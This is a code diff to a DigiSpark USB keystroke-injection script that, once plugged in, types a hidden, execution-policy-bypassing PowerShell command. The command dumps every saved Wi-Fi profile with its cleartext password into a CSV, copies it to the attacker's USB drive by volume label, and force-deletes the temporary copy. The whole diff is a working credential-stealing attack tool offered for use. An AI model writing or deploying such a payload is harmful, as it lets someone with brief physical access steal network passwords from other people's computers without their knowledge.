@@ -1,4 +1,5 @@
-//This DigiSpark script writes the wireless network credentials to a csv file in a usb mounted at d:\ - change accordingly.
+//This DigiSpark script writes the wireless network credentials to a csv file on a usb drive.  
+//Change "VolumeName='USB_DRIVE_LABEL'" to reflect your drive's label.
 //Credits to p0wc0w.
 #include "DigiKeyboard.h"
 void setup() {
@@ -12,20 +13,8 @@ void loop() {
   DigiKeyboard.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv temp.csv"));
+  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv c:\\windows\\temp\\temp.csv; cp c:\\windows\\temp\\temp.csv -destination $((gwmi -Query \\\"Select * from Win32_LogicalDisk where VolumeName='USB_DRIVE_LABEL'\\\").DeviceID); ri c:\\windows\\temp\\temp.csv -force"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("copy temp.csv d:\\"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("del temp.csv"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for(;;){ /*empty*/ }
